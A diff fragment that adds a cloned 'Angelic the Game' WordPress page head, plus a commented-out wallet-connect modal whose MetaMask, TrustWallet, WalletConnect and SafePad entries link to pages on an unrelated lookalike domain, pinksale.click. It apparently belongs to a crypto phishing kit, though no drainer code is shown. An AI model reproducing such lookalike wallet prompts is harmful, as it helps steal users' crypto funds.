MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="" class="ProviderItem_icon__oFLfl"> -->
+                        <!-- <div class="ProviderItem_title__3FOuh">Metamask</div> -->
+                      <!-- </div> -->
+                    <!-- </div> -->
+                  <!-- </div> -->
+                  <!-- <div class="ant-spin-nested-loading"> -->
+                    <!-- <div class="ant-spin-container"> -->
+                      <!-- <div class="ProviderItem_item__HM76S"> -->
+                        <!-- <img src="https://pinksale.click/trustwallet.html" alt="" class="ProviderItem_icon__oFLfl"> -->
+                        <!-- <div class="ProviderItem_title__3FOuh">TrustWallet</div> -->
+                      <!-- </div> -->
+                    <!-- </div> -->
+                  <!-- </div> -->
+                  <!-- <div class="ant-spin-nested-loading"> -->
+                    <!-- <div class="ant-spin-container"> -->
+                      <!-- <div class="ProviderItem_item__HM76S"> -->
+                        <!-- <img src="https://pinksale.click/walletconnect.html" alt="" class="ProviderItem_icon__oFLfl"> -->
+                        <!-- <div class="ProviderItem_title__3FOuh">WalletConnect</div> -->
+                      <!-- </div> -->
+                    <!-- </div> -->
+                  <!-- </div> -->
+                  <!-- <div class="ant-spin-nested-loading"> -->
+                    <!-- <div class="ant-spin-container"> -->
+                      <!-- <div class="ProviderItem_item__HM76S"> -->
+                        <!-- <img src="https://pinksale.click/safepad.html" alt="" class="ProviderItem_icon__oFLfl"> -->
+                        <!-- <div class="ProviderItem_title__3FOuh">SafePad Wallet</div> -->
+                      <!-- </div> -->
+                    <!-- </div> -->
+                  <!-- </div> -->
+                <!-- </div> -->
+              <!-- </div> -->
+            <!-- </div> -->
+            <!-- <div tabindex="0" style="width: 0px; height: 0px; overflow: hidden; outline: currentcolor none medium;" aria-hidden="true"></div> -->
+          <!-- </div> -->
+        <!-- </div> -->
+      <!-- </div> -->
+    <!-- </div> -->
+  
+<!-- <div id="WEB3_CONNECT_MODAL_ID"><div class="sc-jSFkmK kRmdPb web3modal-modal-lightbox" offset="0" opacity="0.4"><div class="sc-gKAblj fVQpCb web3modal-modal-container"><div class="sc-iCoHVE knnrxv web3modal-modal-hitbox"></div><div class="sc-fujyUd hdPMvV web3modal-modal-card"><div class="sc-eCApGN cjAFRf web3modal-provider-wrapper"><div class="sc-hKFyIo jcNZzC web3modal-provider-container"><div class="sc-bdnylx jMhaxE web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjM1NSIgdmlld0JveD0iMCAwIDM5NyAzNTUiIHdpZHRoPSIzOTciIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0ibm9uZSIgZmlsbC1ydWxlPSJldmVub2RkIiB0cmFuc2Zvcm09InRyYW5zbGF0ZSgtMSAtMSkiPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTIuMDA0NzE3IDEzLjgxMDE5OHYtMTguMDU5NDlsNC4yNDUyODMtNC4yNDkyOTJoMjkuNzE2OTgydjIxLjI0NjQ1OSAxNC44NzI1MjNoLTMxLjgzOTYyNGwtMzkuMjY4ODY4LTE2Ljk5NzE2OXoiIGZpbGw9IiNjZGJkYjIiLz48cGF0aCBkPSJtMTk5LjUyODMwNSAzMjcuMTk1NDcyIDUwLjk0MzM5NyAxMy44MTAxOTh2LTE4LjA1OTQ5bDQuMjQ1MjgzLTQuMjQ5MjkyaDI5LjcxNjk4MXYyMS4yNDY0NTkgMTQuODcyNTIzaC0zMS44Mzk2MjNsLTM5LjI2ODg2OC0xNi45OTcxNjl6IiBmaWxsPSIjY2RiZGIyIiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSA0ODMuOTYyMjcgMCkiLz48cGF0aCBkPSJtMTcwLjg3MjY0NCAyODcuODg5NTIzLTQuMjQ1MjgzIDM1LjA1NjY1NyA1LjMwNjYwNC00LjI0OTI5Mmg1NS4xODg2OGw2LjM2NzkyNSA0LjI0OTI5Mi00LjI0NTI4NC0zNS4wNTY2NTctOC40OTA1NjUtNS4zMTE2MTUtNDIuNDUyODMyIDEuMDYyMzIzeiIgZmlsbD0iIzM5MzkzOSIvPjxwYXRoIGQ9Im0xNDIuMjE2OTg0IDUwLjk5MTUwMjIgMjUuNDcxNjk4IDU5LjQ5MDA4NTggMTEuNjc0NTI4IDE3My4xNTg2NDNoNDEuMzkxNTExbDEyLjczNTg0OS0xNzMuMTU4NjQzIDIzLjM0OTA1Ni01OS40OTAwODU4eiIgZmlsbD0iI2Y4OWMzNSIvPjxwYXRoIGQ9Im0zMC43NzgzMDIzIDE4MS42NTcyMjYtMjkuNzE2OTgxNTMgODYuMDQ4MTYxIDc0LjI5MjQ1MzkzLTQuMjQ5MjkzaDQ3Ljc1OTQzNDN2LTM3LjE4MTMwM2wtMi4xMjI2NDEtNzYuNDg3MjUzLTEwLjYxMzIwOCA4LjQ5ODU4M3oiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtODcuMDI4MzAzMiAxOTEuMjE4MTM0IDg3LjAyODMwMjggMi4xMjQ2NDYtOS41NTE4ODYgNDQuNjE3NTYzLTQxLjM5MTUxMS0xMC42MjMyMjl6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkyLjI4MDQ1NyAzNi4wODQ5MDU4IDMzLjk5NDMzNHYzMy45OTQzMzR6IiBmaWxsPSIjZWE4ZDNhIi8+PHBhdGggZD0ibTEyMy4xMTMyMDkgMjI3LjMzNzExNCA0Mi40NTI4MzEgMTAuNjIzMjI5IDEzLjc5NzE3IDQ1LjY3OTg4OC05LjU1MTg4NiA1LjMxMTYxNS00Ni42OTgxMTUtMjcuNjIwMzk4eiIgZmlsbD0iI2Y4OWQzNSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDI2MS4zMzE0NDgtOC40OTA1NjUgNjUuODY0MDI0IDU2LjI1LTM5LjMwNTk0OXoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTc0LjA1NjYwNiAxOTMuMzQyNzggNS4zMDY2MDQgOTAuMjk3NDUxLTE1LjkxOTgxMi00Ni4yMTEwNDl6IiBmaWxsPSIjZWE4ZTNhIi8+PHBhdGggZD0ibTc0LjI5MjQ1MzkgMjYyLjM5Mzc3MSA0OC44MjA3NTUxLTEuMDYyMzIzLTguNDkwNTY1IDY1Ljg2NDAyNHoiIGZpbGw9IiNkODdjMzAiLz48cGF0aCBkPSJtMjQuNDEwMzc3NyAzNTUuODc4MTkzIDkwLjIxMjI2NjMtMjguNjgyNzIxLTQwLjMzMDE5MDEtNjQuODAxNzAxLTczLjIzMTEzMzEzIDUuMzExNjE2eiIgZmlsbD0iI2ViOGYzNSIvPjxwYXRoIGQ9Im0xNjcuNjg4NjgyIDExMC40ODE1ODgtNDUuNjM2NzkzIDM4LjI0MzYyNy0zNS4wMjM1ODU4IDQyLjQ5MjkxOSA4Ny4wMjgzMDI4IDMuMTg2OTY5eiIgZmlsbD0iI2U4ODIxZSIvPjxwYXRoIGQ9Im0xMTQuNjIyNjQ0IDMyNy4xOTU0NzIgNTYuMjUtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIvPjxwYXRoIGQ9Im0yMjkuMjQ1Mjg2IDMyNy4xOTU0NzIgNTUuMTg4NjgtMzkuMzA1OTQ5LTQuMjQ1MjgzIDMzLjk5NDMzNHYxOS4xMjE4MTNsLTM4LjIwNzU0OC03LjQzNjI2eiIgZmlsbD0iI2RmY2VjMyIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgNTEzLjY3OTI1MiAwKSIvPjxwYXRoIGQ9Im0xMzIuNjY1MDk2IDIxMi40NjQ1OTMtMTEuNjc0NTI4IDI0LjQzMzQyNyA0MS4zOTE1MS0xMC42MjMyMjl6IiBmaWxsPSIjMzkzOTM5IiB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAyODMuMzcyNjQ2IDApIi8+PHBhdGggZD0ibTIzLjM0OTA1NyAxLjA2MjMyMjk2IDE0NC4zMzk2MjUgMTA5LjQxOTI2NTA0LTI0LjQxMDM3OC01OS40OTAwODU4eiIgZmlsbD0iI2U4OGYzNSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5Ni0xOS4xMDM3NzM5MiA1OC40Mjc3NjI5NCAxMC42MTMyMDc3MiA2My43MzkzNzgxLTcuNDI5MjQ1NDEgNC4yNDkyOTIgMTAuNjEzMjA3NzEgOS41NjA5MDYtOC40OTA1NjYxNyA3LjQzNjI2MSAxMS42NzQ1Mjg0NyAxMC42MjMyMjktNy40MjkyNDU0IDYuMzczOTM4IDE2Ljk4MTEzMjMgMjEuMjQ2NDU5IDc5LjU5OTA1NzctMjQuNDMzNDI4YzM4LjkxNTA5Ni0zMS4xNjE0NzMgNTguMDE4ODY5LTQ3LjA5NjMxOCA1Ny4zMTEzMjItNDcuODA0NTMzLS43MDc1NDgtLjcwODIxNS00OC44MjA3NTYtMzcuMTgxMzAzNi0xNDQuMzM5NjI1LTEwOS40MTkyNjUwNHoiIGZpbGw9IiM4ZTVhMzAiLz48ZyB0cmFuc2Zvcm09Im1hdHJpeCgtMSAwIDAgMSAzOTkuMDU2NjExIDApIj48cGF0aCBkPSJtMzAuNzc4MzAyMyAxODEuNjU3MjI2LTI5LjcxNjk4MTUzIDg2LjA0ODE2MSA3NC4yOTI0NTM5My00LjI0OTI5M2g0Ny43NTk0MzQzdi0zNy4xODEzMDNsLTIuMTIyNjQxLTc2LjQ4NzI1My0xMC42MTMyMDggOC40OTg1ODN6IiBmaWxsPSIjZjg5ZDM1Ii8+PHBhdGggZD0ibTg3LjAyODMwMzIgMTkxLjIxODEzNCA4Ny4wMjgzMDI4IDIuMTI0NjQ2LTkuNTUxODg2IDQ0LjYxNzU2My00MS4zOTE1MTEtMTAuNjIzMjI5eiIgZmlsbD0iI2Q4N2MzMCIvPjxwYXRoIGQ9Im04Ny4wMjgzMDMyIDE5Mi4yODA0NTcgMzYuMDg0OTA1OCAzMy45OTQzMzR2MzMuOTk0MzM0eiIgZmlsbD0iI2VhOGQzYSIvPjxwYXRoIGQ9Im0xMjMuMTEzMjA5IDIyNy4zMzcxMTQgNDIuNDUyODMxIDEwLjYyMzIyOSAxMy43OTcxNyA0NS42Nzk4ODgtOS41NTE4ODYgNS4zMTE2MTUtNDYuNjk4MTE1LTI3LjYyMDM5OHoiIGZpbGw9IiNmODlkMzUiLz48cGF0aCBkPSJtMTIzLjExMzIwOSAyNjEuMzMxNDQ4LTguNDkwNTY1IDY1Ljg2NDAyNCA1NS4xODg2OC0zOC4yNDM2MjZ6IiBmaWxsPSIjZWI4ZjM1Ii8+PHBhdGggZD0ibTE3NC4wNTY2MDYgMTkzLjM0Mjc4IDUuMzA2NjA0IDkwLjI5NzQ1MS0xNS45MTk4MTItNDYuMjExMDQ5eiIgZmlsbD0iI2VhOGUzYSIvPjxwYXRoIGQ9Im03NC4yOTI0NTM5IDI2Mi4zOTM3NzEgNDguODIwNzU1MS0xLjA2MjMyMy04LjQ5MDU2NSA2NS44NjQwMjR6IiBmaWxsPSIjZDg3YzMwIi8+PHBhdGggZD0ibTI0LjQxMDM3NzcgMzU1Ljg3ODE5MyA5MC4yMTIyNjYzLTI4LjY4MjcyMS00MC4zMzAxOTAxLTY0LjgwMTcwMS03My4yMzExMzMxMyA1LjMxMTYxNnoiIGZpbGw9IiNlYjhmMzUiLz48cGF0aCBkPSJtMTY3LjY4ODY4MiAxMTAuNDgxNTg4LTQ1LjYzNjc5MyAzOC4yNDM2MjctMzUuMDIzNTg1OCA0Mi40OTI5MTkgODcuMDI4MzAyOCAzLjE4Njk2OXoiIGZpbGw9IiNlODgyMWUiLz48cGF0aCBkPSJtMTMyLjY2NTA5NiAyMTIuNDY0NTkzLTExLjY3NDUyOCAyNC40MzM0MjcgNDEuMzkxNTEtMTAuNjIzMjI5eiIgZmlsbD0iIzM5MzkzOSIgdHJhbnNmb3JtPSJtYXRyaXgoLTEgMCAwIDEgMjgzLjM3MjY0NiAwKSIvPjxwYXRoIGQ9Im0yMy4zNDkwNTcgMS4wNjIzMjI5NiAxNDQuMzM5NjI1IDEwOS40MTkyNjUwNC0yNC40MTAzNzgtNTkuNDkwMDg1OHoiIGZpbGw9IiNlODhmMzUiLz48cGF0aCBkPSJtMjMuMzQ5MDU3IDEuMDYyMzIyOTYtMTkuMTAzNzczOTIgNTguNDI3NzYyOTQgMTAuNjEzMjA3NzIgNjMuNzM5Mzc4MS03LjQyOTI0NTQxIDQuMjQ5MjkyIDEwLjYxMzIwNzcxIDkuNTYwOTA2LTguNDkwNTY2MTcgNy40MzYyNjEgMTEuNjc0NTI4NDcgMTAuNjIzMjI5LTcuNDI5MjQ1NCA2LjM3MzkzOCAxNi45ODExMzIzIDIxLjI0NjQ1OSA3OS41OTkwNTc3LTI0LjQzMzQyOGMzOC45MTUwOTYtMzEuMTYxNDczIDU4LjAxODg2OS00Ny4wOTYzMTggNTcuMzExMzIyLTQ3LjgwNDUzMy0uNzA3NTQ4LS43MDgyMTUtNDguODIwNzU2LTM3LjE4MTMwMzYtMTQ0LjMzOTYyNS0xMDkuNDE5MjY1MDR6IiBmaWxsPSIjOGU1YTMwIi8+PC9nPjwvZz48L3N2Zz4=" alt="MetaMask"></div><div class="sc-gtssRu bktcUM web3modal-provider-name">MetaMask</div><div class="sc-dlnjPT eFHlqH web3modal-provider-description">Connect to your MetaMask Wallet</div></div></div><div class="sc-eCApGN cjAFRf web3modal-provider-wrapper"><div class="sc-hKFyIo jcNZzC web3modal-provider-container"><div class="sc-bdnylx jMhaxE web3modal-provider-icon"><img src="data:image/svg+xml;base64,PHN2ZyBoZWlnaHQ9IjUxMiIgdmlld0JveD0iMCAwIDUxMiA1MTIiIHdpZHRoPSI1MTIiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgeG1sbnM6eGxpbms9Imh0dHA6Ly93d3cudzMub3JnLzE5OTkveGxpbmsiPjxyYWRpYWxHcmFkaWVudCBpZD0iYSIgY3g9IjAlIiBjeT0iNTAlIiByPSIxMDAlIj48c3RvcCBvZmZzZXQ9IjAiIHN0b3AtY29sb3I9IiM1ZDlkZjYiLz48c3RvcCBvZmZzZXQ9IjEiIHN0b3AtY29sb3I9IiMwMDZmZmYiLz48L3JhZGlhbEdyYWRpZW50PjxnIGZpbGw9Im5vbmUiIGZpbGwtcnVsZT0iZXZlbm9kZCI+PHBhdGggZD0ibTI1NiAwYzE0MS4zODQ4OTYgMCAyNTYgMTE0LjYxNTEwNCAyNTYgMjU2cy0xMTQuNjE1MTA0IDI1Ni0yNTYgMjU2LTI1Ni0xMTQuNjE1MTA0LTI1Ni0yNTYgMTE0LjYxNTEwNC0yNTYgMjU2LTI1NnoiIGZpbGw9InVybCgjYSkiLz48cGF0aCBkPSJtNjQuNjkxNzU1OCAzNy43MDg4Mjk4YzUxLjUzMjgwNzItNTAuMjc4NDM5NyAxMzUuMDgzOTk0Mi01MC4yNzg0Mzk3IDE4Ni42MTY3OTkyIDBsNi4yMDIwNTcgNi4wNTEwOTA2YzIuNTc2NjQgMi41MTM5MjE4IDIuNTc2NjQgNi41ODk3OTQ4IDAgOS4xMDM3MTc3bC0yMS4yMTU5OTggMjAuNjk5NTc1OWMtMS4yODgzMjEgMS4yNTY5NjE5LTMuMzc3MSAxLjI1Njk2MTktNC42NjU0MjEgMGwtOC41MzQ3NjYtOC4zMjcwMjA1Yy0zNS45NTA1NzMtMzUuMDc1NDk2Mi05NC4yMzc5NjktMzUuMDc1NDk2Mi0xMzAuMTg4NTQ0IDBsLTkuMTQwMDI4MiA4LjkxNzU1MTljLTEuMjg4MzIxNyAxLjI1Njk2MDktMy4zNzcxMDE2IDEuMjU2OTYwOS00LjY2NTQyMDggMGwtMjEuMjE1OTk3My0yMC42OTk1NzU5Yy0yLjU3NjY0MDMtMi41MTM5MjI5LTIuNTc2NjQwMy02LjU4OTc5NTggMC05LjEwMzcxNzd6bTIzMC40OTM0ODUyIDQyLjgwODkxMTcgMTguODgyMjc5IDE4LjQyMjcyNjJjMi41NzY2MjcgMi41MTM5MTAzIDIuNTc2NjQyIDYuNTg5NzU5My4wMDAwMzIgOS4xMDM2ODYzbC04NS4xNDE0OTggODMuMDcwMzU4Yy0yLjU3NjYyMyAyLjUxMzk0MS02Ljc1NDE4MiAyLjUxMzk2OS05LjMzMDg0LjAwMDA2Ni0uMDAwMDEtLjAwMDAxLS4wMDAwMjMtLjAwMDAyMy0uMDAwMDMzLS4wMDAwMzRsLTYwLjQyODI1Ni01OC45NTc0NTFjLS42NDQxNi0uNjI4NDgxLTEuNjg4NTUtLjYyODQ4MS0yLjMzMjcxIDAtLjAwMDAwNC4wMDAwMDQtLjAwMDAwOC4wMDAwMDctLjAwMDAxMi4wMDAwMTFsLTYwLjQyNjk2ODMgNTguOTU3NDA4Yy0yLjU3NjYxNDEgMi41MTM5NDctNi43NTQxNzQ2IDIuNTEzOTktOS4zMzA4NDA4LjAwMDA5Mi0uMDAwMDE1MS0uMDAwMDE0LS4wMDAwMzA5LS4wMDAwMjktLjAwMDA0NjctLjAwMDA0NmwtODUuMTQzODY3NzQtODMuMDcxNDYzYy0yLjU3NjYzOTI4LTIuNTEzOTIxLTIuNTc2NjM5MjgtNi41ODk3OTUgMC05LjEwMzcxNjNsMTguODgyMzEyNjQtMTguNDIyNjk1NWMyLjU3NjYzOTMtMi41MTM5MjIyIDYuNzU0MTk5My0yLjUxMzkyMjIgOS4zMzA4Mzk3IDBsNjAuNDI5MTM0NyA1OC45NTgyNzU4Yy42NDQxNjA4LjYyODQ4IDEuNjg4NTQ5NS42Mjg0OCAyLjMzMjcxMDMgMCAuMDAwMDA5NS0uMDAwMDA5LjAwMDAxODItLjAwMDAxOC4wMDAwMjc3LS4wMDAwMjVsNjAuNDI2MTA2NS01OC45NTgyNTA4YzIuNTc2NTgxLTIuNTEzOTggNi43NTQxNDItMi41MTQwNzQzIDkuMzMwODQtLjAwMDIxMDMuMDAwMDM3LjAwMDAzNTQuMDAwMDcyLjAwMDA3MDkuMDAwMTA3LjAwMDEwNjNsNjAuNDI5MDU2IDU4Ljk1ODM1NDhjLjY0NDE1OS42Mjg0NzkgMS42ODg1NDkuNjI4NDc5IDIuMzMyNzA5IDBsNjAuNDI4MDc5LTU4Ljk1NzE5MjVjMi41NzY2NC0yLjUxMzkyMzEgNi43NTQxOTktMi41MTM5MjMxIDkuMzMwODM5IDB6IiBmaWxsPSIjZmZmIiBmaWxsLXJ1bGU9Im5vbnplcm8iIHRyYW5zZm9ybT0idHJhbnNsYXRlKDk4IDE2MCkiLz48L2c+PC9zdmc+" alt="WalletConnect"></div><div class="sc-gtssRu bktcUM web3modal-provider-name">WalletConnect</div><div class="sc-dlnjPT eFHlqH web3modal-provider-description">Scan with WalletConnect to connect</div></div></div></div></div></div></div></body></html> -->
+	<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<link rel="pingback" href="xmlrpc.php" />
+
+	<script type="text/javascript">
+		document.documentElement.className = 'js';
+	</script>
+	
+	<meta name='robots' content='index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1' />
+
+	<!-- This site is optimized with the Yoast SEO plugin v18.2 - https://yoast.com/wordpress/plugins/seo/ -->
+	<title>Angelic the Game - Join the Ranks of the Angels!</title>
+	<meta name="description" content="Angelic combines turn-based strategy combat with a narrative RPG, all backed by a collaboratively crafting science-fiction setting thanks to blockchain technology. Get ready to shape a massive conflict in the dark and compelling universe of Angelic." />
+	<link rel="canonical" href="index.html" />
+	<meta property="og:locale" content="en_US" />
+	<meta property="og:type" content="website" />
+	<meta property="og:title" content="Angelic the Game - Join the Ranks of the Angels!" />
+	<meta property="og:description" content="Angelic combines turn-based strategy combat with a narrative RPG, all backed by a collaboratively crafting science-fiction setting thanks to blockchain technology. Get ready to shape a massive conflict in the dark and compelling universe of Angelic." />
+	<meta property="og:url" content="https://angelicthegame.com/" />
+	<meta property="og:site_name" content="Angelic the Game" />
+	<meta property="article:modified_time" content="2022-03-29T18:21:59+00:00" />
+	<meta property="og:image" content="https://angelicthegame.com/wp-content/uploads/2021/11/slide1_b.jpg" />
+	<meta property="og:image:width" content="1200" />
+	<meta property="og:image:height" content="676" />
+	<meta property="og:image:type" content="image/jpeg" />
+	<meta name="twitter:card" content="summary_large_image" />
+	<meta name="twitter:description" content="Angelic combines turn-based strategy combat with a narrative RPG, all backed by a collaboratively crafting science-fiction setting thanks to blockchain technology. Get ready to shape a massive conflict in the dark and compelling universe of Angelic." />
+	<meta name="twitter:image" content="https://angelicthegame.com/wp-content/uploads/2021/11/slide1_b.jpg" />
+	<meta name="twitter:label1" content="Est. reading time" />
+	<meta name="twitter:data1" content="18 minutes" />
+	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Organization","@id":"https://angelicthegame.com/#organization","name":"Angelic the Game","url":"https://angelicthegame.com/","sameAs":[],"logo":{"@type":"ImageObject","@id":"https://angelicthegame.com/#logo","inLanguage":"en-US","url":"https://angelicthegame.com/wp-content/uploads/2022/01/Angelic-Logo-Cropped-Small.png","contentUrl":"https://angelicthegame.com/wp-content/uploads/2022/01/Angelic-Logo-Cropped-Small.png","width":700,"height":48,"caption":"Angelic the Game"},"image":{"@id":"https://angelicthegame.com/#logo"}},{"@type":"WebSite","@id":"https://angelicthegame.com/#website","url":"https://angelicthegame.com/","name":"Angelic the Game","description":"Narrative Turn-Based Sci-Fi RPG","publisher":{"@id":"https://angelicthegame.com/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://angelicthegame.com/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://angelicthegame.com/#primaryimage","inLanguage":"en-US","url":"https://angelicthegame.com/wp-content/uploads/2021/11/slide1_b.jpg","contentUrl":"https://angelicthegame.com/wp-content/uploads/2021/11/slide1_b.jpg","width":1200,"height":676},{"@type":"WebPage","@id":"https://angelicthegame.com/#webpage","url":"https://angelicthegame.com/","name":"Angelic the Game - Join the Ranks of the Angels!","isPartOf":{"@id":"https://angelicthegame.com/#website"},"about":{"@id":"https://angelicthegame.com/#organization"},"primaryImageOfPage":{"@id":"https://angelicthegame.com/#primaryimage"},"datePublished":"2021-11-20T00:17:39+00:00","dateModified":"2022-03-29T18:21:59+00:00","description":"Angelic combines turn-based strategy combat with a narrative RPG, all backed by a collaboratively crafting science-fiction setting thanks to blockchain technology. Get ready to shape a massive conflict in the dark and compelling universe of Angelic.","breadcrumb":{"@id":"https://angelicthegame.com/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://angelicthegame.com/"]}]},{"@type":"BreadcrumbList","@id":"https://angelicthegame.com/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Home"}]}]}</script>
+	<!-- / Yoast SEO plugin. -->
+
+
+<link rel='dns-prefetch' href='http://fonts.googleapis.com/' />
+<link rel='dns-prefetch' href='http://s.w.org/' />
+<link rel="alternate" type="application/rss+xml" title="Angelic the Game &raquo; Feed" href="feed/index.html" />
+<link rel="alternate" type="application/rss+xml" title="Angelic the Game &raquo; Comments Feed" href="comments/feed/index.html" />
+<script type="text/javascript">
+window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.1.0\/svg\/","svgExt":".svg","source":{"concatemoji":"https:\/\/angelicthegame.com\/wp-includes\/js\/wp-emoji-release.min.js?ver=5.9.3"}};
+/*! This file is auto-generated */
+!function(e,a,t){var n,r,o,i=a.createElement("canvas"),p=i.getContext&&i.getContext("2d");function s(e,t){var a=String.fromCharCode;p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,e),0,0);e=i.toDataURL();return p.clearRect(0,0,i.width,i.height),p.fillText(a.apply(this,t),0,0),e===i.toDataURL()}function c(e){var t=a.createElement("script");t.src=e,t.defer=t.type="text/javascript",a.getElementsByTagName("head")[0].appendChild(t)}for(o=Array("flag","emoji"),t.supports={everything:!0,everythingExceptFlag:!0},r=0;r<o.length;r++)t.supports[o[r]]=function(e){if(!p||!p.fillText)return!1;switch(p.textBaseline="top",p.font="600 32px Arial",e){case"flag":return s([127987,65039,8205,9895,65039],[127987,65039,8203,9895,65039])?!1:!s([55356,56826,55356,56819],[55356,56826,8203,55356,56819])&&!s([55356,57332,56128,56423,56128,56418,56128,56421,56128,56430,56128,56423,56128,56447],[55356,57332,8203,56128,56423,8203,56128,56418,8203,56128,56421,8203,56128,56430,8203,56128,56423,8203,56128,56447]);case"emoji":return!s([10084,65039,8205,55357,56613],[10084,65039,8203,55357,56613])}return!1}(o[r]),t.supports.everything=t.supports.everything&&t.supports[o[r]],"flag"!==o[r]&&(t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&t.supports[o[r]]);t.supports.everythingExceptFlag=t.supports.everythingExceptFlag&&!t.supports.flag,t.DOMReady=!1,t.readyCallback=function(){t.DOMReady=!0},t.supports.everything||(n=function(){t.readyCallback()},a.addEventListener?(a.addEventListener("DOMContentLoaded",n,!1),e.addEventListener("load",n,!1)):(e.attachEvent("onload",n),a.attachEvent("onreadystatechange",function(){"complete"===a.readyState&&t.readyCallback()})),(n=t.source||{}).concatemoji?c(n.concatemoji):n.wpemoji&&n.twemoji&&(c(n.twemoji),c(n.wpemoji)))}(window,document,window._wpemojiSettings);
+</script>
+<meta content="Divi Child v.4.13.1.1637430604" name="generator"/><style type="text/css">
+img.wp-smiley,
+img.emoji {
+	display: inline !important;
+	border: none !important;
+	box-shadow: none !important;
+	height: 1em !important;
+	width: 1em !important;
+	margin: 0 0.07em !important;
+	vertical-align: -0.1em !important;
+	background: none !important;
+	padding: 0 !important;
+}
+</style>
+	<link rel='stylesheet' id='wp-block-library-css'  href='wp-includes/css/dist/block-library/style.min7404.css?ver=5.9.3' type='text/css' media='all' />
+<style id='global-styles-inline-css' type='text/css'>
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 